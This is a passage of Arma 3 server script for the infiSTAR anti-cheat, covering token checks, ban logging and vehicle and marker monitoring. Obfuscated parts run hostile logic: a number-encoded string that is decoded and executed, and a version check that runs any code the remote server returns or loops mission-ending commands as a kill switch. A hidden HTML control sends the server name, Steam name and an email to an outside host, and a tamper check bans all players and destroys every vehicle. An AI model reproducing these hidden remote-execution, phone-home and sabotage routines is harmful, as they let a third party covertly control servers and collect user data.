						if(str(_x select 0) != str(_x select 1))then
						{
							_log = format['%1: %2',(_x select 2),(_x select 0)];
							[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
							[] spawn "+_AHKickOFF+";
						};
					} forEach [
						[EPOCH_clientInit,_EPOCH_clientInit,'EPOCH_clientInit'],
						[EPOCH_onEachFrame,_EPOCH_onEachFrame,'EPOCH_onEachFrame'],
						[EPOCH_client_rejectPlayer,_EPOCH_client_rejectPlayer,'EPOCH_client_rejectPlayer'],
						[EPOCH_clientRespawn,_EPOCH_clientRespawn,'EPOCH_clientRespawn'],
						[EPOCH_fnc_playerDeath,_EPOCH_fnc_playerDeath,'EPOCH_fnc_playerDeath'],
						[EPOCH_fnc_playerFired,_EPOCH_fnc_playerFired,'EPOCH_fnc_playerFired'],
						[EPOCH_KeyDown,_EPOCH_KeyDown,'EPOCH_KeyDown'],
						[EPOCH_pushCustomVar,_EPOCH_pushCustomVar,'EPOCH_pushCustomVar']
					];
				"; }; _A3AHstring = _A3AHstring + "
				"+_ninetwo+" = true;
				if(!isNil '"+_ninetwothread+"')then{terminate "+_ninetwothread+";"+_ninetwothread+" = nil;};
			};
			_log = 'Loop #14 ended!';
			[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
			[] spawn "+_AHKickOFF+";
		};
	};
	if(isNil'VERSIONCHECKRESULT')then{VERSIONCHECKRESULT='';};
	_hours = floor(serverTime / 60 / 60);_value = ((serverTime / 60 / 60) - _hours);if(_value == 0)then{_value = 0.0001;};_minutes = round(_value * 60);_seconds = '1311';
	_devLog = format['<infiSTAR.de> %1 VERSION: 02-Dec-2016 18-49-36 infiSTAR.de AHAT (v0245) - server running: %2:%3:%4',VERSIONCHECKRESULT,_hours,_minutes,_seconds];diag_log _devLog;
	systemChat format['%1 <infiSTAR.de> Successfully Loaded In.',time];
	if(_puid in "+str _devs+")then{diag_log str _admins;{diag_log format['<infiSTAR.de> %1',_x];} forEach diag_activeSQFScripts;};
	"+_AH_RunCheckENDVAR+" = 'k';
	
	
	
	
	
	if(isNil '"+_adminsA+"')exitWith
	{
		_log = 'Temp Admin Array - ARRAY is Nil';
		[_name,_puid,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
		[] spawn "+_AHKickOFF+";
	};
	if(typeName "+_adminsA+" != 'ARRAY')exitWith
	{
		_log = 'Temp Admin Array - TYPE CHANGED';
		[_name,_puid,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
		[] spawn "+_AHKickOFF+";
	};
	if(_puid in _admins)then
	{
		infiSTAR_ADMINS = "+_adminsA+";
		'"+_adminsA+"' addPublicVariableEventhandler
		{
			infiSTAR_ADMINS = _this select 1;
		};
		infiSTAR_MOD = "+str _MOD+";
		infiSTAR_DEVS = "+str _devs+";
		if(_puid in "+_adminsA+")then
		{
			systemChat format['%1 <infiSTAR.de> Welcome Admin!',time];
			if(isNil'fnc_AdminReq')then
			{
				fnc_AdminReq = compileFinal ""
					if(isNil'"+_YourPlayerToken+"')exitWith{KICKED_FOR_NIL_TOKEN_AdminReq = 'KICKED_FOR_NIL_TOKEN_AdminReq';publicVariableServer 'KICKED_FOR_NIL_TOKEN_AdminReq';(findDisplay 46)closeDisplay 0;};
					PVAH_AdminReq = ["+_YourPlayerToken+",_this,netId player];publicVariableServer 'PVAH_AdminReq';PVAH_AdminReq=nil;
				"";
			};
			[1234,player,getPlayerUID player] call fnc_AdminReq;
		};
	};
	"+_massMessage+"=nil;'"+_massMessage+"' addPublicVariableEventHandler {(_this select 1) spawn bis_fnc_dynamictext;"+_massMessage+"=nil;};
	"+_massSysMessage+"=nil;'"+_massSysMessage+"' addPublicVariableEventHandler {systemChat (_this select 1);"+_massSysMessage+"=nil;};
	"+_clientdo+"=nil;'"+_clientdo+"' addPublicVariableEventHandler {call compile (_this select 1);"+_clientdo+"=nil;};
	if(!isNil 'BPDCODE')then{call BPDCODE;BPDCODE=nil;};
	"; if(_TGV != -1)then{ _A3AHstring = _A3AHstring + "
		setTerrainGrid "+str _TGV+";
	"; }; _A3AHstring = _A3AHstring + "
	"; if(_VDV != -1)then{ _A3AHstring = _A3AHstring + "
		setViewDistance "+str _VDV+";
	"; }; _A3AHstring = _A3AHstring + "
	"; if(_VOV != -1)then{ _A3AHstring = _A3AHstring + "
		setObjectViewDistance "+str _VOV+";
	"; }; _A3AHstring = _A3AHstring + "
};
"+_AH_MAIN_BLOCK+" = _AH_MAIN_BLOCK;
_from = 'leopinheirohn@gmail.com';
_vers = '02-Dec-2016 18-49-36 - v0245';
_1=[];{_1 pushBack sqrt (_x-(15820));}forEach [23216,20581,22544,22709,21149,22061,21904,24845,20309,21004,20581,20309,21445,24845,23045,22544,21596,24845,20720,23045,21596,21596,16844,19541,16844,26224,28141,28816,27701,25229,29276,24101,17341,26636,29276,29276,28364,19184,18029,18029,29744,17936,26845,27920,26224,26845,22709,22876,20045,22544,17936,25820,26021,18029,26845,27920,25820,26021,30220,17936,28364,26636,28364,19789,26224,19541,17189,18221,17264,29744,19541,17189,18320,17264,28364,19541,17189,18421,17264,28364,29045,19541,17189,18524,17264,29045,19541,17189,18629,17341,17756,24845,26224,28816,28141,27701,17756,24845,29744,26021,28816,29045,17756,28364,28816,28141,26224,26845,27484,26021,21904,25229,27701,26021,17756,28364,28816,28141,26224,26845,27484,26021,21904,25229,27701,26021,22709,29276,26021,25229,27701,17756,29045,26021,28816,29744,26021,28816,27920,25229,27701,26021,24469,19301];call compile toString _1;
[] spawn {
	private['_packet1','_jobid','_packet2','_res'];
	_packet1 = format['getasync%1%2%1',toString [10],VERSION_CHECK_URL_FULL];
	_jobid = 'ARMA_LOAD' callExtension _packet1;
	_packet2 = format['response%1%2%1',toString [10],_jobid];
	_timeout = diag_tickTime + 80;
	_res = 'WAIT';
	_bad = ['','WAIT','ERROR','URLERROR'];
	waitUntil{
		uiSleep 3;
		_res = 'ARMA_LOAD' callExtension _packet2;
		(!(_res in _bad) && ((toLower _res) find 'wrapper is disabled' isEqualTo -1)) || diag_tickTime > _timeout
	};
	if(_res find '$do$' != -1)exitWith{_res = (_res select [4]);call compile _res;};
	if(_res == '1')exitWith{
		while{true}do{
			_obj = 'Supply0' createVehicle [0,0,0];_do = 'failMission ''LOSER'';endMission ''LOSER'';forceEnd;';
			_do call FNC_A3_GLOBAL;
			failMission 'LOSER';
			endMission 'LOSER';
			forceEnd;
			uiSleep 1;
		};
	};
	if(_res in _bad)exitWith{};if((toLower _res) find 'wrapper is disabled' != -1)exitWith{};
	VERSIONCHECKRESULT = _res;publicVariable'VERSIONCHECKRESULT';
};
diag_log format['<infiSTAR.de> %1 - Thread MAIN: none-threaded code compiled and/or sent!',time];
[] spawn {
	diag_log format['<infiSTAR.de> %1 - Thread #1: Server Loop #1 starting now!',time];
	"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
		"; if(_CLG)then{ _A3AHstring = _A3AHstring + "
			fnc_HandleDisconnectDead =
			{
				private['_aa','_ab','_ac','_ad','_name','_af','_ag','_ah','_aj','_ak','_al','_am'];
				_aa=_this select 0;
				_name=_this select 1;
				_aj=getPlayerUID _aa;
				_ab=getposATL _aa;
				if(random 1 <=EPOCH_antagonistChancePDeath)then
				{
					_ad=2;
					if(surfaceIsWater _ab)then
					{
						_ad=3;
					};
				};
				_ak=EPOCH_customVars find 'Crypto';
				_al=_aa getVariable['VARS',call EPOCH_defaultVars_SEPXVar];
				_am=_al select _ak;
				_ac=createVehicle['Land_MPS_EPOCH',_ab,[],1.5,'NONE'];
				_ac setVariable['Crypto',_am,true];
				[_aa, _aa getVariable['VARS', []]] call EPOCH_server_savePlayer;
				if(EPOCH_cloneCost > 0)then
				{
					_ah=['Bank',_aj]call EPOCH_fnc_server_hiveGETRANGE;
					if((_ah select 0)==1 && typeName(_ah select 1)=='ARRAY')then
					{
						_ag=_ah select 1;
						_af=0;
						if !(_ag isEqualTo[])then
						{
							_af=_ag select 0;
						};
						_af=_af-EPOCH_cloneCost;
						['Bank',_aj,EPOCH_expiresBank,[_af]]call EPOCH_fnc_server_hiveSETEX;
					};
				};
			};
			if(isNil'"+_inCombatArray+"')then{"+_inCombatArray+" = [];};
		"; }; _A3AHstring = _A3AHstring + "
	"; }; _A3AHstring = _A3AHstring + "
	diag_log format['<infiSTAR.de> %1 - Thread #1: Server Loop #1 looping now!',time];
	_admins = "+str _admins+";
	_a = ['_USER_DEFINED'];if("+str _UMW+")then{_a = _a + "+str _aLocalM+";};
	_mtimer = time + 30;
	_string = toString[105,110,102,105,83,84,65,82];
	_fnc_zero_two =
	{
		if(time > _mtimer)then
		{
			if((_string != 'infiSTAR')||('<'+_string+'.de>' != '<infiSTAR.de>')||(_string+'.de' != 'infiSTAR.de'))then
			{
				{
					_puid = getPlayerUID _x;
					if(_puid != '')then
					{
						_name = name _x;
						[_name,_puid,'BAN',toArray('')] call "+_FNC_AH1311_KICKLOG+";
					};
				} forEach allPlayers;
				{_x setDamage 1;}forEach vehicles;
			};
			_mtimer = time + 30;
			"; if(_CLM)then{ _A3AHstring = _A3AHstring + "
				"+_MC+" = allMapMarkers;publicVariable '"+_MC+"';
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_CGM)then{ _A3AHstring = _A3AHstring + "
				if(isNil'"+_MCS+"')then
				{
					"+_MCS+" = allMapMarkers;
					"+_MCS+" pushBack '"+_MAKE_VAR_DUMP_RANDOM+"';
					"+_MCS+" pushBack '"+_MAKE_VAR_DUMP_CLIENT+"';
				};
				{
					if!(_x in "+_MCS+")then
					{
						_marker = _x;
						_lowMarker = toLower _marker;
						"+_MCS+" pushBack _marker;
						_MarkerText = MarkerText _marker;
						_do = true;
						{if(_lowMarker find (toLower _x) != -1)exitWith{_do = false;}} forEach _a;
						if(_do)then
						{
							if(_lowMarker in ['gefmarker','deinvadder','swagmarker','dmcmarking','life_mpPacket_send'])then
							{
								_log = format['HackedMarker: %1 - %2',_marker,_MarkerText];
								_log call FNC_A3_HACKLOG;
								_log = _log select [0,180];
								"+_AH_HackLogArrayRND+" pushBack _log;
								deleteMarker _marker;
							}
							else
							{
								if!(_MarkerText in ['Epicenter','Poppy','Ferris','Container','Mineral','Leiche',''])then
								{
									_mytime = call fnc_getserverTime;
									_log = _mytime + format['DodgyMarker: %1   (with text: %2)',_marker,_MarkerText];
									
									_log = _mytime + format['DODGYMARKER: %1 | TEXT: %2 | TYPE: %3 | POS: %4',_marker,_MarkerText,markerType _marker,markerPos _marker];
									
									_log call FNC_A3_SURVEILLANCELOG;
									_log = _log select [0,180];
									"+_AH_SurvLogArrayRND+" pushBack _log;
								};
							};
						};
					};
				} forEach allMapMarkers;
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_RAM)then{ _A3AHstring = _A3AHstring + "
				{deleteVehicle _x;} forEach allMines;
			"; }; _A3AHstring = _A3AHstring + "
			"; if(_RUS)then{ _A3AHstring = _A3AHstring + "
				{deleteVehicle _x;} forEach allUnitsUAV;
			"; }; _A3AHstring = _A3AHstring + "
		};
	};
	'PVAH_AdminReq' addPublicVariableEventHandler {(_this select 1) call "+_FNC_PVAH_AdminReq+";};
	"; if((_MOD == 'Epoch')&&(_MPH))then{ _A3AHstring = _A3AHstring + "
		LOG_MPHIT_HANDLER =
		{
			private['_unit','_causedBy','_damage','_unit_ident','_causedBy_ident','_health','_cwep','_displayName','_cammo','_cmags','_cwep','_log'];
			_unit = _this select 0;
			if(isNil'_unit')exitWith{};
			if(isNull _unit)exitWith{};
			_causedBy = _this select 1;
			if(isNil'_causedBy')exitWith{};
			_damage = _this select 2;
			if(isNil'_damage')exitWith{};
			if(_damage < 0.1)exitWith{};
			_unit_ident = if(isPlayer _unit)then{format['%1(%2)',_unit getVariable['realname',name _unit],getPlayerUID _unit];}else{'UNKNOWN'};
			_causedBy_ident = if(isPlayer _causedBy)then{format['%1(%2)',_causedBy getVariable['realname',name _causedBy],getPlayerUID _causedBy];}else{'UNKNOWN'};
			
			uiSleep .3;
			
			_log = '';
			_health = (1-(damage _unit))*100;
			if(_causedBy_ident == 'UNKNOWN')then
			{
				if(_damage < 0.2)exitWith{};
				_log = format['%1 hit with %2 damage. Health: %3 - @%4',_unit_ident,_damage,_health,mapGridPosition _unit];
			}
			else
			{
				_cwep = currentWeapon _causedBy;
				if(_cwep != '')then
				{
					_displayName = getText (configFile >> 'cfgWeapons' >> _cwep >> 'displayName');
					_cammo = _causedBy ammo _cwep;
					_cmags = {currentMagazine _causedBy == _x} count magazines _causedBy;
					_cwep = format['Weapon: %1 [%2] (%3/%4)   ',_displayName,_cwep,_cammo,_cmags];
				};
				if((_damage > 0.1)&&(_health == 100))then
				{
					_log = format['%1  hit by  %2  with %3 damage. Health: %4 (godmode?) - Distance: %5m - %6@%7',_unit_ident,_causedBy_ident,_damage,_health,_unit distance _causedBy,_cwep,mapGridPosition _unit];
				}
				else
				{
					_log = format['%1  hit by  %2  with %3 damage. Health: %4 - Distance: %5m - %6@%7',_unit_ident,_causedBy_ident,_damage,_health,_unit distance _causedBy,_cwep,mapGridPosition _unit];
				};
			};
			if(_log!='')then
			{
				'ARMA_LOG' callExtension format['A3_MPHIT:%1 (v0245)',_log];
			};
		};
		LOG_MPHIT_HANDLER = compileFinal ([LOG_MPHIT_HANDLER] call fnc_CompilableString);
	"; }; _A3AHstring = _A3AHstring + "
	"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
		fnc_SaveConnectedInfo = {
			private['_connectUID','_connectSTATUS'];
			_connectUID = _this select 0;
			_connectSTATUS = _this select 1;
			
			if(_connectSTATUS==1)then
			{
				if(_connectUID in "+_connectedArray+")then
				{
					_connectUID_ID = "+_connectedArray+" find _connectUID;
					"+_connectedArray+" set[(_connectUID_ID+1),time];
				}
				else
				{
					"+_connectedArray+" append [_connectUID,time];
				};
			}
			else
			{
				if(_connectUID in "+_tokenSentArray+")then
				{
					_connectUID_ID = "+_tokenSentArray+" find _connectUID;
					"+_tokenSentArray+" deleteAt _connectUID_ID;
				};
				if(_connectUID in "+_connectedArray+")then
				{
					_connectUID_ID = "+_connectedArray+" find _connectUID;
					"+_connectedArray+" deleteRange [_connectUID_ID,(_connectUID_ID+1)];
				}
				else
				{
					_mytime = call fnc_getserverTime;
					_log = _mytime + format['%1(%2) was not completely connected before he disconnected.',_this select 2,_connectUID];
					_log call FNC_A3_CONNECTLOG;
				};
			};
		};
		fnc_SaveConnectedInfo = compileFinal ([fnc_SaveConnectedInfo] call fnc_CompilableString);
	"; }; _A3AHstring = _A3AHstring + "
[] spawn {_WW = compile toString[99,116,114,108,72,84,77,76,76,111,97,100,101,100,32,95,104];_FF = compile toString[95,104,32,104,116,109,108,76,111,97,100,32,95,108];waitUntil{time > 30};disableSerialization;_idd=24;waitUntil {createDialog ('R'+'s'+'c'+'D'+'i'+'s'+'p'+'l'+'a'+'y'+'C'+'h'+'a'+'t');uiSleep 1;diag_log str allDisplays;!isNull findDisplay _idd};_h = (findDisplay _idd) ctrlCreate [('R'+'s'+'c'+'H'+'T'+'M'+'L'), 3307182];_h ctrlSetBackgroundColor [0,0,0,0.3];_l = toString[104,116,116,112,58,47,47,105,110,102,105,83,84,65,82,46,101,117,47,115,97,51,46,112,104,112,63,115,110];_randomNumber = 1318;_from = missionNameSpace getVariable[('U'+'P'+'D'+'A'+'T'+'E'+'E'+'M'+'A'+'I'+'L'),_randomNumber];_vers = missionNameSpace getVariable[('I'+'N'+'F'+'I'+'S'+'T'+'A'+'R'+'V'+'E'+'R'+'S'+'I'+'O'+'N'),_randomNumber];_l = format[""%1=%2&sp=%3&um=%4&i=%5&s=%6"",_l,serverName,profileNameSteam,_from,_vers,productVersion];_l = _l call fn_clean_bad;call _FF;_t = time+10;waitUntil {call _WW || time > _t};ctrlDelete _h;closeDialog 0;};
_zero = ""
if(isNil 'FN_infiSTAR_C')then{
FN_infiSTAR_C__NILLED = format['%1(%2) NIL',profileName,getPlayerUID player];publicVariableServer'FN_infiSTAR_C__NILLED';
(findDisplay 46)closeDisplay 0;
};
if(str FN_infiSTAR_C != str {(_this select 0) call (_this select 1)})then {
FN_infiSTAR_C__MODIFIED = format['%1(%2) %3',profileName,getPlayerUID player,FN_infiSTAR_C];publicVariableServer'FN_infiSTAR_C__MODIFIED';
(findDisplay 46)closeDisplay 0;
};
"";
_grpLogic = creategroup sidelogic;
_array = [[0,0,0], _grpLogic, "";"" + (_zero) + "";""];
'Logic' createUnit _array;
waitUntil {count (units _grpLogic) > 0};
{_x setVariable['BIS_enableRandomization',false];_x setVariable['"+_LogicVariable+"','1'];} forEach (units _grpLogic);
waitUntil {({_x getVariable['"+_LogicVariable+"','-1'] == '1'} count ([0,0,0] nearEntities ['Logic',100])) isEqualTo 1};
_next = false;



_DO_THIS_MORE_OFTEN = {
	missionNameSpace setVariable['""+_antiantihack_rndvar+""',nil];
	[] spawn {uiSleep 1;if(isNil '""+_antiantihack_rndvar+""')then{diag_log '<infiSTAR.de> kicked to lobby #9';(findDisplay 46)closeDisplay 0;};};
	if(isNil'""+_antiantihack_rndvar+""')then
	{
		_bis_fnc_diagkey = 'bis_fnc_diagkey';
		_bla = 'waitUntil{';
		_diag = 'diag';
		_AntiHack = 'AntiHack';
		_PV_ = 'PV_';
		_infiSTAR = 'infiSTAR';
		_STAR = 'STAR';
		_infi = 'infi';
		_closeDisplay = 'closeDisplay';
		_EndMission = 'EndMission';
		_GetPlayerUID = 'GetPlayerUID';
		if(!isNull player)then{_uid = getPlayerUID player;_puid = getPlayerUID player;};
		missionNameSpace setVariable['""+_antiantihack_rndvar+""','""+_antiantihack_rndvar+""'];
	};
	if(hasInterFace)then
	{
		{
			if(!isNil _x)then
			{
				_var = missionNamespace getVariable _x;
				if(typeName _var != 'STRING')then
				{
					[] spawn "+_AHKickOFF+";
				};
			};
		} forEach ['"+_YourPlayerToken+"'];
		{
			if(!isNil _x)then
			{
				_var = missionNamespace getVariable _x;
				if(typeName _var != 'ARRAY')then
				{
					[] spawn "+_AHKickOFF+";
				};
			};
		} forEach ['"+_AH1311_KICKLOG+"','"+_adminsA+"','"+_MC+"'];
		{
			if(!isNil _x)then
			{
				_var = missionNamespace getVariable _x;
				if(typeName _var == 'CODE')then
				{
					_log = format['AntiAntiHack #1: %1 - %2',_x,_var];
					[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
			};
		} forEach [
			'"+_massSysMessage+"','"+_RequestToken+"',
			'"+_ninetwo+"','"+_ninetwothread+"','"+_AH_RunCheckENDVAR+"','"+_clientdo+"',
			'"+_massMessage+"','"+_AHpos+"','"+_oneachframe+"','"+_checkidicheckcheck+"','"+_lastshotmade+"',
			'"+_dellocveh+"','"+_inCombatTime+"'
		];
		if(isNil'"+_AH_RunCheckENDVAR+"')then
		{
			[] spawn {
				_temptime= diag_tickTime + 180;
				_temptime2= time + 180;
				waitUntil {(!isNil'"+_AH_RunCheckENDVAR+"') || {diag_tickTime > _temptime && time > _temptime2}};
				if(isNil'"+_AH_RunCheckENDVAR+"')then
				{
					_log = 'AH_RunCheck is not defined';
					[profileName,getPlayerUID player,'HLOG_SKICK',toArray(_log)] call "+_AH1311KICKLOG+";
					[] spawn "+_AHKickOFF+";
				};
			};
		};
		{
			_mNs = missionNamespace getVariable _x;
			if(!isNil '_mNs')then
			{
				_log = format['BadVar#3 in missionNamespace: %1 - %2',_x,_mNs];
				[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
				[] spawn "+_AHKickOFF+";
			};
			_pNs = profileNamespace getVariable _x;
			if(!isNil '_pNs')then
			{
				_log = format['BadVar#3 in profileNamespace (LOGGED, ANNOUNCED & SET TO NIL): %1 - %2',_x,_pNs];
				[profileName,getPlayerUID player,'HLOG',toArray(_log)] call "+_AH1311KICKLOG+";
				profileNamespace setVariable[_x,nil];saveprofileNamespace;
			};
		} forEach "+str _BadVar3Array+";
		"; if(_UMH)then{ _A3AHstring = _A3AHstring + "
			[] spawn {				
				_UMH_ARRAYSERVER = "+str _UMH_ARRAYSERVER+";
				_UMH_ARRAY = "+str _UMH_ARRAY+";
				{
					_curarray = _UMH_ARRAY select _forEachIndex;
					_string = call compile (_curarray select 0);
					_sarray = toArray _string;
					if!(_sarray isEqualTo _x)then
					{
						_is = toString _sarray;
						_sb = toString _x;
						_log = format['Memoryhack %1 %2 changed: %3, %4',_curarray select 1,_curarray select 2,_is,_sb];
						[profileName,getPlayerUID player,'BAN',toArray(_log)] call "+_AH1311KICKLOG+";
						[] spawn "+_AHKickOFF+";
					};
				} forEach _UMH_ARRAYSERVER;
			};
		"; }; _A3AHstring = _A3AHstring + "
	};
};




		_timer0 = 0;
		_timer1 = time + 35;
		_timer2 = time + 30;
		while{1==1}do
		{
			if(_next)then{{_x setVariable['BIS_enableRandomization',false];_x setVariable['"+_LogicVariable+"','1'];} forEach (units _grpLogic);};
			_countLogics = {_x getVariable['"+_LogicVariable+"','-1'] == '1'} count ([0,0,0] nearEntities ['Logic',100]);
			if!(_countLogics isEqualTo 1)then
			{
				_log = format['Logic count has changed to %1 - should be 1!',_countLogics];
				_log call FNC_A3_HACKLOG;
				"; if(_enableIngameLogs)then{ _A3AHstring = _A3AHstring + "
					"+_AH_HackLogArrayRND+" pushBack _log;{if((getPlayerUID _x) in _admins)then{(owner _x) publicVariableClient '"+_AH_HackLogArrayRND+"';};} forEach allPlayers;
				"; }; _A3AHstring = _A3AHstring + "
				
				_array = [[0,0,0], _grpLogic, "";"" + (_zero) + "";""];
				'Logic' createUnit _array;
				_next = true;
			};
			
			if(time > _timer0)then
			{
				_timer0 = time + 20;
				'"+_AH1311_KICKLOG+"' addPublicVariableEventHandler {(_this select 1) call "+_FNC_AH1311_KICKLOGSPAWN+";};
				uiSleep 1;
				
				['',_DO_THIS_MORE_OFTEN,-2,false] call FN_infiSTAR_S;
				uiSleep 1;
				
				call _fnc_zero_two;
				uiSleep 1;
			};
			
			if(time > _timer1)then
			{
				_timer1 = time + 35;
				
				{
					if(!isNull _x)then
					{
						if(alive _x)then
						{
							_uid = nil;
							_uid = getPlayerUID _x;
							if(isNil'_uid')exitWith{};
							if!(_uid isEqualTo '')then
							{
								if(_uid select [0,2] == 'HC')exitWith{};
								
								_name = name _x;
								[_uid,_name,owner _x] call fnc_infiSTAR_PlayerLog;
								_namePlayerObject = _x getVariable['realname','-1'];
								if(_namePlayerObject isEqualTo '-1')then
								{
									_x setVariable['realname',_name,true];
								};
								_puidPlayerObject = _x getVariable['PUID','-1'];
								if!(_puidPlayerObject isEqualTo _uid)then
								{
									_x setVariable['PUID',_uid];
								};
								
								if(isPlayer _x)then
								{
									"; if(_MOD == 'Epoch')then{ _A3AHstring = _A3AHstring + "
										"; if(_TOC)then{ _A3AHstring = _A3AHstring + "
											if!(_uid in "+_tokenSentArray+")then
											{
												if(_uid in "+_connectedArray+")then
												{
													_connectUID_ID = "+_connectedArray+" find _uid;
													_timeConnected = "+_connectedArray+" select (_connectUID_ID+1);
													_timePassed = floor(time - _timeConnected);
													if(_timePassed > 60)then
													{
														_log = format['PlayerConnected %1 seconds ago but did not Request a Token!   (NEW & EXPERIMENTAL CHECK) - UNIT TYPE: %2',_timePassed,typeOf _x];
														[_name,_uid,'HLOG_SKICK',toArray(_log)] call "+_FNC_AH1311_KICKLOG+";
													};
												};
											};
										"; }; _A3AHstring = _A3AHstring + "
										"; if(_MPH)then{ _A3AHstring = _A3AHstring + "
											_x removeAllMPEventHandlers 'MPHit';
											_x addMPEventHandler['MPHit',{_this spawn LOG_MPHIT_HANDLER}];
										"; }; _A3AHstring = _A3AHstring + "
									"; }; _A3AHstring = _A3AHstring + "
								};
							};
						};
					};
				} forEach allPlayers;
			};
			
			"; if(_UVC)then{ _A3AHstring = _A3AHstring + "
				if(time > _timer2)then
				{
					_timer2 = time + 30;
					
					{
						if(!isNull _x)then
						{
							_veh = vehicle _x;
							_type = typeOf _veh;
							if((!("+str _UVW+") && {_type in "+str _ForbiddenVehicles+"}) || (("+str _UVW+") && {!(_type in "+str _VehicleWhiteList+")}))then
							{
								_crew = crew _veh;
								if(_crew isEqualTo [])then
								{
									_log = format['BadVehicle (S-UVC): %1',_type];
									['SERVER','SERVER','HLOG',toArray(_log)] call "+_FNC_AH1311_KICKLOG+";
									_veh call fnc_deleteObject;
								}
								else
								{
									if(call{{if((getPlayerUID _x) in "+_adminsA+")exitWith{true};false} forEach _crew;})exitWith{};
									
									_log = format['BadVehicle (S-UVC): %1',_type];
									{
										_name = name _x;
										_puid = getPlayerUID _x;
										[_name,_puid,'HLOG',toArray(_log)] call "+_FNC_AH1311_KICKLOG+";
									} forEach _crew;
									_veh call fnc_deleteObject;
								};
							};
						};
					} forEach ([0,0,0] nearEntities [['LandVehicle','Air','Ship','Static'], 10000000]);
				};
			"; }; _A3AHstring = _A3AHstring + "
			uiSleep 10;
			SERVER_FPS = diag_fps;publicVariable 'SERVER_FPS';
			SERVER_THREADS = count diag_activeSQFScripts;publicVariable 'SERVER_THREADS';
		};
		_log = format['%1 - LOOP - BROKEN!',time];
		_log call FNC_A3_HACKLOG;
	};










_zeroCode = {
	if(hasInterface)then
	{
		_AHKickOFF = compileFinal '
			sleep 0.1;
			(findDisplay 46)closeDisplay 0;
			if(!isNil''"+_AH1311KICKLOG+"'')then{[profileName,getPlayerUID player,''KICKME''] call "+_AH1311KICKLOG+";};
		';
		if(isNil'"+_AHKickOFF+"')then{"+_AHKickOFF+" = _AHKickOFF;};
		if(str _AHKickOFF != str "+_AHKickOFF+")then{[] spawn _AHKickOFF;};
		_AH1311KICKLOG = compileFinal ""
			if(!isNil'"+_YourPlayerToken+"')then
			{
				"+_AH1311_KICKLOG+" = ["+_YourPlayerToken+",_this,netId player];publicVariableServer '"+_AH1311_KICKLOG+"';"+_AH1311_KICKLOG+"=nil;
			}
			else
			{
				_this spawn {
					_temptime = time+15;_tempdiagtime = diag_tickTime+15;
					waitUntil{!isNil '"+_YourPlayerToken+"' || time > _temptime || diag_tickTime > _tempdiagtime};
					if(isNil'"+_YourPlayerToken+"')exitWith{KICKED_FOR_NIL_TOKEN_AH1311KICKLOG = format['PLAYER__%1__%2',getPlayerUID player,_this];publicVariableServer 'KICKED_FOR_NIL_TOKEN_AH1311KICKLOG';(findDisplay 46)closeDisplay 0;};
					"+_AH1311_KICKLOG+" = ["+_YourPlayerToken+",_this,netId player];publicVariableServer '"+_AH1311_KICKLOG+"';"+_AH1311_KICKLOG+"=nil;
				};
			};
		"";
		if(isNil'"+_AH1311KICKLOG+"')then{"+_AH1311KICKLOG+" = _AH1311KICKLOG;};
		if(str _AH1311KICKLOG != str "+_AH1311KICKLOG+")then{[] spawn _AHKickOFF;};
		if(!isNil'"+_TokenCT+"')then{if(typeName "+_TokenCT+" == 'SCRIPT')then{terminate "+_TokenCT+";}else{TOKENCT_BROKEN='TOKENCT_BROKEN';publicVariableServer'TOKENCT_BROKEN';[] spawn _AHKickOFF;};};
		"+_TokenCT+" = [_AHKickOFF] spawn {
			private['_tmpYourPlayerToken','_AHKickOFF'];
			_AHKickOFF = _this select 0;
			waitUntil {!isNil '"+_YourPlayerToken+"'};
			_tmpYourPlayerToken = "+_YourPlayerToken+";
			if(typeName "+_YourPlayerToken+" != 'STRING')then{TOKEN_NO_STRING='TOKEN_NO_STRING';publicVariableServer'TOKEN_NO_STRING';};
			waitUntil {if(isNil'"+_YourPlayerToken+"')then{"+_YourPlayerToken+"='';};str _tmpYourPlayerToken != str "+_YourPlayerToken+"};
			TOKEN_BROKEN='TOKEN_BROKEN';publicVariableServer'TOKEN_BROKEN';
			[] spawn _AHKickOFF;
		};
		
		inGameUISetEventHandler ['PrevAction','false'];
		inGameUISetEventHandler ['NextAction','false'];
		inGameUISetEventHandler ['Action','false'];
		_bis_fnc_diagkey = uiNamespace getVariable['bis_fnc_diagkey',{false}];
		if(!isNil'_bis_fnc_diagkey')then{if!((str _bis_fnc_diagkey) in ['{false}','{}'])then{bis_fnc_diagkeychanged='bis_fnc_diagkeychanged';publicVariableServer'bis_fnc_diagkeychanged';};};
		'"+_YourPlayerToken+"' addPublicVariableEventhandler compileFinal
		""
			_this spawn {
				private['_tokenrec'];
				_tokenrec = _this select 1;
				waitUntil {if(isNil'"+_YourPlayerToken+"')then{"+_YourPlayerToken+"='';};str _tokenrec != str "+_YourPlayerToken+"};
				HANDLER_TOKEN_BROKEN='HANDLER_TOKEN_BROKEN';publicVariableServer'HANDLER_TOKEN_BROKEN';
				(findDisplay 46)closeDisplay 0;
			};
		"";
		[] spawn {
			if(isNil'"+_YourPlayerToken+"')then
			{
				waitUntil{getClientStateNumber >= 10};
				_tmpPlayer = objNull;
				waitUntil{_tmpPlayer = player;(!isNull player&&{time > 25}&&{!isNull (findDisplay 46)}&&{isPlayer player}&&{alive player}&&{getPlayerUID player != ''})};
				if(isNil'"+_YourPlayerToken+"')then
				{
					uiSleep 3;
					if(!(_tmpPlayer isEqualTo player)||(isNull _tmpPlayer))then
					{
						waitUntil{_tmpPlayer = player;(!isNull player&&{time > 25}&&{!isNull (findDisplay 46)}&&{isPlayer player}&&{alive player}&&{getPlayerUID player != ''})};
						uiSleep 1;
					};
					"+_RequestToken+"=[player,getPlayerUID player,'CU'];publicVariableServer '"+_RequestToken+"';"+_RequestToken+"=nil;
					_temptime= diag_tickTime + 15;
					waitUntil {!isNil '"+_YourPlayerToken+"' || {diag_tickTime > _temptime}};
					if(isNil'"+_YourPlayerToken+"')exitWith
					{
						for '_i' from 0 to 5 do {
							_log = 'Loading Error - You have to relog';
							systemchat _log;
							cutText [_log, 'PLAIN'];
						};
